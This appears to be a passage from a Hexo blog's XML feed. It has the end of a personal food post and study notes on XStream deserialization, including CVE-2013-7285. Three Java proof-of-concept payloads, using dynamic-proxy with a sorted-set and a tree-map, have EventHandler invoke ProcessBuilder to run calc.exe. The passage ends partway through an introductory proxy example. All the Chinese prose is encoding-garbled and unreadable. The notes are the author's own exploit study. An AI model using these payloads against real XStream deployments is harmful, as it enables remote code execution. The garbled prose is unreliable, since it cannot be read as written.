alt="7c7dc08afe29898eef427727d0d8e99"></p><p>è¶…çº§é²œçš„è™¾ä»ã€‚ï¼ˆåšçš„çœŸçš„æŒºæ£’çš„ï¼ˆå¾—åˆ°æˆ‘å’Œå®è´çš„èµåŒï¼ï¼ï¼‰ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141745116.jpg" alt="3f3e0fcd28b604d2f97b017cbac4e71"></p><p>emmmï¼Œè¿˜æœ‰ä¸ªç³–é†‹é‡Œè„Šã€‚åƒèµ·æ¥çœŸçš„ä¸å’‹æ»´ã€‚ï¼ˆä½†æ˜¯è¿˜æ˜¯æ¨èèœï¼Œå°±ç¦»ç¦»åŸä¸Šæ™®ã€‚ï¼‰</p><h3 id="å¿˜äº†åå­—çš„ï¼ˆå®è´æƒ³èµ·æ¥äº†ï¼‰ï¼ˆå£æ°´é¸¡çœ‰å±±å·èœï¼‰"><a href="#å¿˜äº†åå­—çš„ï¼ˆå®è´æƒ³èµ·æ¥äº†ï¼‰ï¼ˆå£æ°´é¸¡çœ‰å±±å·èœï¼‰" class="headerlink" title="å¿˜äº†åå­—çš„ï¼ˆå®è´æƒ³èµ·æ¥äº†ï¼‰ï¼ˆå£æ°´é¸¡çœ‰å±±å·èœï¼‰"></a>å¿˜äº†åå­—çš„ï¼ˆå®è´æƒ³èµ·æ¥äº†ï¼‰ï¼ˆå£æ°´é¸¡çœ‰å±±å·èœï¼‰</h3><p>å§‘ä¸”å«å®ƒç™½æ–©é¸¡</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141747984.jpg" alt="ea37fdbb5d6fd18f278cba8bddb7349"></p><p>è¾£è¾£è¾£è¾£ï¼Œä½†æ˜¯å®è´å°±çˆ±åƒé‡Œé¢çš„èåœä¸ï¼Œå°±å¾ˆç¦»è°±ã€‚ç¬¬ä¸€æ¬¡çœ‹å®è´ï¼Œåƒçš„è¾£å‡ºæ±—æ°´ç„¶åè¿˜è¦ä¸€ç›´åƒã€‚å“ˆå“ˆå“ˆã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141748618.jpg" alt="d74c56e97f18d2e29624f63ec8eed34"></p><p>ç¾ä¸½çš„å¤©é¹…è…¿<del>.</del></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141748053.jpg"></p><p>åˆæ˜¯è™¾ä»ï¼Œåƒèµ·æ¥è¿˜æ˜¯éå¸¸ä¸é”™ã€‚å°±æ˜¯åˆç”œåˆè¾£ï¼ˆæœ‰ç‚¹æ€ªå¼‚ï¼ï¼‰</p><h2 id="è›‹ç³•"><a href="#è›‹ç³•" class="headerlink" title="è›‹ç³•"></a>è›‹ç³•</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141750347.jpg" alt="014476fafa3edcd47f3abcc2e832f55"></p><p>æå‡ºä¸¥é‡æ‰¹è¯„ï¼Œæµªè´¹ï¼</p><h2 id="ç¦»è°±"><a href="#ç¦»è°±" class="headerlink" title="ç¦»è°±"></a>ç¦»è°±</h2><p>æˆ‘äº²çˆ±çš„å®è´è¿ç€åƒäº†å‡ å¤©çš„å¥½åƒçš„ã€‚ç„¶åå›å­¦æ ¡ï¼Œæ˜æ˜å¾ˆç´¯ã€‚ç„¶åè¿˜ä¸é¥¿ã€‚ç»“æœæ™šä¸Šåƒæ³¡é¢ã€‚å±å®è®©æˆ‘æ— è¯­ä½äº†ï¼Œä¸‹æ¬¡å¸¦çŒªå„¿å‡ºå»åƒè‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141758553.png" alt="image-20220314175849105"></p>]]></content>
    
    
    <categories>
      
      <category>æ¸¸ç©è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>çˆ±æƒ…</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XStreamï¼ˆCVE-2013-7285ï¼‰</title>
    <link href="/2022/03/10/XStream%EF%BC%88CVE-2013-7285%EF%BC%89/"/>
    <url>/2022/03/10/XStream%EF%BC%88CVE-2013-7285%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="XStreamï¼ˆCVE-2013-7285ï¼‰"><a href="#XStreamï¼ˆCVE-2013-7285ï¼‰" class="headerlink" title="XStreamï¼ˆCVE-2013-7285ï¼‰"></a>XStreamï¼ˆCVE-2013-7285ï¼‰</h1><p>çœ‹äº†å¾ˆå¤šåšä¸»ï¼Œè¿˜æ˜¯<a href="http://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">mi1k7ea</a>å¸ˆå‚…å†™çš„å¥½ã€‚ï¼ˆå“ˆå“ˆå“ˆå»ºè®®ç›´æ¥è·³è½¬é¡µé¢ï¼‰ï¼Œæˆ‘å†™çš„åªä¾›è‡ªå·±å¤ä¹ ã€‚</p><p>ä¸Šä¸€ç¯‡å¤ä¹ åˆ°ç±»ä¼¼ccé“¾çš„ä¸€ä¸ªç±»ã€‚<strong>EventHandle</strong>ï¼Œå¹¶ä¸”å®ç°äº†å¼¹å‡ºè®¡ç®—å™¨ã€‚è¿˜äº†è§£äº†å…¶å¦‚ä½•ååºåˆ—åŒ–ã€‚<br>è¿™é‡Œè¦è¡¥å……ä¸€ä¸ªæ–°çŸ¥è¯†ç‚¹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101719235.png" alt="QQæˆªå›¾20220310164057"></p><p><strong>dynamic-proxyæ ‡ç­¾åœ¨XStreamååºåˆ—åŒ–ä¹‹åä¼šå¾—åˆ°ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»å¯¹è±¡ï¼Œå½“è®¿é—®äº†è¯¥å¯¹è±¡çš„com.foo.Blahæˆ–com.foo.Wooè¿™ä¸¤ä¸ªæ¥å£ç±»ä¸­å£°æ˜çš„æ–¹æ³•æ—¶ï¼ˆå³interfaceæ ‡ç­¾å†…æŒ‡å®šçš„æ¥å£ç±»ï¼‰ï¼Œå°±ä¼šè°ƒç”¨handleræ ‡ç­¾ä¸­çš„ç±»æ–¹æ³•com.foo.MyHandlerã€‚</strong></p><h2 id="POCï¼ˆåŸºäºæ¥å£ï¼‰"><a href="#POCï¼ˆåŸºäºæ¥å£ï¼‰" class="headerlink" title="POCï¼ˆåŸºäºæ¥å£ï¼‰"></a>POCï¼ˆåŸºäºæ¥å£ï¼‰</h2><p><strong>è¯¥æ¥å£å¯ä»¥æ˜¯ä»»æ„çš„publicæ¥å£ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.io.HierarchicalStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XstreamDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;dynamic-proxy&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;interface&gt;com.thoughtworks.xstream.io.HierarchicalStreamReader&lt;/interface&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;            &lt;command&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        \t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;            &lt;/command&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;/target&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;/handler&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;&lt;/dynamic-proxy&gt;&quot;</span>;<br>      <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>      <span class="hljs-type">HierarchicalStreamReader</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> (HierarchicalStreamReader)xStream.fromXML(s);<br>      obj.hasMoreChildren();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>command</code>æ˜¯<code>ProcessBuilder</code>æ¥æ”¶çš„å‚æ•°ã€‚</p><p>targetåŒç†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101717586.png" alt="QQæˆªå›¾20220310171656"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">obj.hasMoreChildren(); <span class="hljs-regexp">//</span>è¿™ä¸€æ­¥ç›¸å½“äºè§¦å‘è®¿é—®æ¥å£è¿™ä¸€æ¡ä»¶ã€‚<br></code></pre></td></tr></table></figure><h2 id="POCï¼ˆåŸºäºSortedSetï¼‰"><a href="#POCï¼ˆåŸºäºSortedSetï¼‰" class="headerlink" title="POCï¼ˆåŸºäºSortedSetï¼‰"></a>POCï¼ˆåŸºäºSortedSetï¼‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.io.HierarchicalStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XStreamDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;sorted-set&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;string&gt;test&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \t\t\t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;/command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;/target&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;/handler&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/sorted-set&gt;&quot;</span>;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>    xStream.fromXML(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•æ€»ç»“ä¸€ä¸‹ã€‚<br>åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ã€‚ç”±äºåœ¨è¿™é‡Œè¿›å…¥<strong>putAll()</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101909251.png" alt="QQæˆªå›¾20220310190929"></p><p>è·Ÿè¿›ï¼<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101902229.png" alt="QQæˆªå›¾20220310190110"></p><p>è¿™é‡Œæˆ‘ä»¬ä¼šå‘ç°è°ƒç”¨äº†ï¼Œ<strong>comparator</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å°±è§¦å‘äº†ã€‚æ¥å£è¿™ä¸ªæ¡ä»¶ã€‚è¾¾åˆ°å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h2 id="POCï¼ˆåŸºäºTreeMapï¼‰"><a href="#POCï¼ˆåŸºäºTreeMapï¼‰" class="headerlink" title="POCï¼ˆåŸºäºTreeMapï¼‰"></a>POCï¼ˆåŸºäºTreeMapï¼‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XstreamDemo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;tree-map&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;string&gt;xsw6a&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;string&gt;xsw6_a&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \t\t\t\t\t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;/command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;/target&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;/handler&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;/dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;string&gt;good&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/tree-map&gt;&quot;</span>;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>         xStream.fromXML(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101910615.png" alt="QQæˆªå›¾20220310191043"></p><p>äº‹å®ä¸Šæ˜¯åŒç†çš„ã€‚</p><p><strong>æ€»ç»“ï¼šæƒ³æ³•è®¾æ³•è§¦å‘æ¥å£ã€‚</strong></p><p>åœ¨XStreamååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œè§£æXMLï¼Œå°†sorted-setæ ‡ç­¾è¯†åˆ«å‡ºå¯¹åº”çš„TreeSetConverterè½¬æ¢å™¨ï¼Œå†è¯†åˆ«å‡ºsorted-setæ ‡ç­¾å†…æœ‰ä¸¤ä¸ªå­å…ƒç´ ï¼Œå³stringæ ‡ç­¾å’Œdynamic-proxyæ ‡ç­¾ï¼›stringæ ‡ç­¾ä¼šè¢«è¯†åˆ«å‡ºStringConverterè½¬æ¢å™¨æ¥è§£æå‡ºstringæ ‡ç­¾å†…çš„å­—ç¬¦ä¸²â€œfooâ€ï¼›dynamic-proxyæ ‡ç­¾ä¼šè¢«è¯†åˆ«å‡ºå¯¹åº”çš„DynamicProxyConverterè½¬æ¢å™¨æ¥è§£æå‡ºåŠ¨æ€ä»£ç†ç±»å¯¹è±¡ï¼›æœ€åç”±äºTreeSetConverterä¼šå¯¹æ¯”ä¸¤ä¸ªå­å…ƒç´ å³è°ƒç”¨$Proxy0.compareTo()æ¥æ¯”è¾ƒï¼Œè€Œdynamic-proxyæ ‡ç­¾å†…å®ç°äº†Comparableæ¥å£ï¼Œå› æ­¤ç”±åŠ¨æ€ä»£ç†æœºåˆ¶ä¼šè§¦å‘dynamic-proxyæ ‡ç­¾å†…çš„handleræ ‡ç­¾æŒ‡å‘çš„EventHandlerç±»æ–¹æ³•ï¼Œä»è€Œåˆ©ç”¨åå°„æœºåˆ¶å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>]]></content>
    
    
    <categories>
      
      <category>XStream</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XStreamï¼ˆå…¥é—¨ï¼‰</title>
    <link href="/2022/03/09/Xstream%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/"/>
    <url>/2022/03/09/Xstream%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Xstream-å…¥é—¨"><a href="#Xstream-å…¥é—¨" class="headerlink" title="Xstream(å…¥é—¨)"></a>Xstream(å…¥é—¨)</h1><h2 id="Demoï¼ˆåºåˆ—åŒ–ï¼‰"><a href="#Demoï¼ˆåºåˆ—åŒ–ï¼‰" class="headerlink" title="Demoï¼ˆåºåˆ—åŒ–ï¼‰"></a>Demoï¼ˆåºåˆ—åŒ–ï¼‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span>  String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setName(<span class="hljs-string">&quot;xsw6_a&quot;</span>);<br>        person.setAge(<span class="hljs-number">20</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> xStream.toXML(person);<br>        System.out.println(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092211796.png" alt="QQæˆªå›¾20220309221126"></p><h2 id="Demoï¼ˆååºåˆ—åŒ–ï¼‰"><a href="#Demoï¼ˆååºåˆ—åŒ–ï¼‰" class="headerlink" title="Demoï¼ˆååºåˆ—åŒ–ï¼‰"></a>Demoï¼ˆååºåˆ—åŒ–ï¼‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;xsw6a.Person&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &lt;age&gt;20&lt;/age&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &lt;name&gt;xsw6_a&lt;/name&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/xsw6a.Person&gt;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> xStream.fromXML(s);<br>        System.out.println(o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="EventHandler"><a href="#EventHandler" class="headerlink" title="EventHandler"></a>EventHandler</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092257563.png" alt="QQæˆªå›¾20220309225653"></p><p>è¿™ä¸ªç±»ç»§æ‰¿äº†ï¼Œ<strong>InvocationHandler</strong>ã€‚æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä¸€ä¸‹å°±æƒ³åˆ°äº†ccé“¾ä¸­çš„é‚£ä¸ªanné‚£ä¸ªç±»ã€‚<strong>é‚£ä¹ˆåªè¦ä»£ç†è¿™ä¸ªç±»ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªç±»çš„invokeæ–¹æ³•ã€‚</strong><br>çœ‹ä¸€ä¸‹å¦‚ä½•èµ°çš„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092301876.png" alt="QQæˆªå›¾20220309230131"></p><p>ä¸€è·¯è·Ÿè¿›ä¼šæ¥åˆ°è¿™é‡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092312104.png" alt="QQæˆªå›¾20220309230859"></p><p>è¿™é‡Œä¼šè°ƒç”¨åå°„ã€‚</p><p>æ‰€ä»¥èƒ½å¤Ÿå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><ul><li>targetMethodï¼šProcessBuilder.start()æ–¹æ³• ï¼ˆactionå‚æ•°ï¼‰</li><li>targetï¼šæ„é€ å¥½å¸¦æœ‰æ¶æ„å‘½ä»¤çš„ProcessBuilderå¯¹è±¡</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6_a;<br><br><span class="hljs-keyword">import</span> java.beans.EventHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">HelloService</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTrue</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HelloService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒè‹¹æœ&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span> 